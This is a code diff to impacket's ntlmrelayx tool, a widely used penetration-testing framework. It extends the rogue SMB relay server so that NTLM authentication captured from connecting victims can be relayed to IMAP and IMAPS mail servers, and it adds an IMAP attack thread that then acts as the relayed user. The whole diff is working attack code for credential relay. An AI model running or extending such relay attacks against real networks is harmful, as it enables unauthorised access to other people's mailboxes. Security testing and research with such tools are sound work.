@@ -23,7 +23,7 @@ import logging
 from impacket import smb, ntlm
 from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
-from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient, HTTPRelayClient
+from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient, HTTPRelayClient, IMAPRelayClient
 from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
 from impacket.spnego import ASN1_AID
 from impacket.examples.ntlmrelayx.utils.targetsutils import ProxyIpTranslator
@@ -353,6 +353,8 @@ class SMBRelayServer(Thread):
             client = LDAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
         if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
             client = HTTPRelayClient("%s://%s:%d/%s" % (self.target[0].lower(),self.target[1],self.target[2],self.target[3]))
+        if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
+            client = IMAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
         return client
 
     #Do the NTLM negotiate
@@ -426,6 +428,19 @@ class SMBRelayServer(Thread):
                 logging.error(str(e))
                 errorCode = STATUS_ACCESS_DENIED
 
+        if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
+            try:
+                result = client.sendAuth(token) #Result is a boolean
+                if result:
+                    errorCode = STATUS_SUCCESS
+                else:
+                    logging.error("IMAP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
+                    errorCode = STATUS_ACCESS_DENIED
+            except Exception, e:
+                logging.error("IMAP NTLM Message type 3 against %s FAILED" % self.target[1])
+                logging.error(str(e))
+                errorCode = STATUS_ACCESS_DENIED
+
         return clientResponse, errorCode
 
     def do_attack(self,client):
@@ -441,6 +456,9 @@ class SMBRelayServer(Thread):
             clientThread.start()
         if self.target[0] == 'MSSQL':
             clientThread = self.config.attacks['MSSQL'](self.config, client)
+            clientThread.start()
+        if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
+            clientThread = self.config.attacks['IMAP'](self.config, client, self.authUser)
             clientThread.start()
 
     def _start(self):
